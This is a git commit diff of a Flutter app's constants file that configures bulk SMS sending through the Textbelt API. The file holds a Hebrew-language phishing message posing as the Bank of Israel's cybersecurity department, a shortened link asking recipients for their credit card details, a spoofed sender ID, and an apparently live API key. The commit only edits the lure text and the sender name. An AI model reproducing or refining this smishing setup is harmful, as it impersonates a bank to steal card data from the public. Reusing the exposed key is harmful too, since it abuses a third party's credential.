64a1208af1ee56d904cdafb52f85575a3838460b
alkhatib99 <aboodjob@gmail.com>
2023-08-09 19:33:02 +0300

    readyyy

--- lib/constants/appConnstants/app_const.dart
+++ lib/constants/appConnstants/app_const.dart
@@ -5,12 +5,12 @@ import 'package:flutter/material.dart';
 class AppConst {
   static const sub1 = 
   
-      "שלום \nאנחנו מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל, אנא מלא את שמות כרטיס האשראי שלך כדי שנדע את בעליו האמיתי\n\n";
+      "שלום \nאנח מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל, אנא מלא את שמות כרטיס האשראי שלך כדי שנדע את בעליו האמיתי\n\n";
 
       static const sub2="https://shorturl.at/GMST3";
       static const message =sub1+sub2;
 
-  static const senderId = "BOI";
+  static const senderId = "RLP";
   static const apiKey = "99e49b10b5ded7f2a8c3f4c9bd9babf6be50758eC5ITx7WPYoaip2ELwZe1vaRsO";
   static const baseUrl = "https://textbelt.com";
   static const textEndPoint = "https://textbelt.com/text";
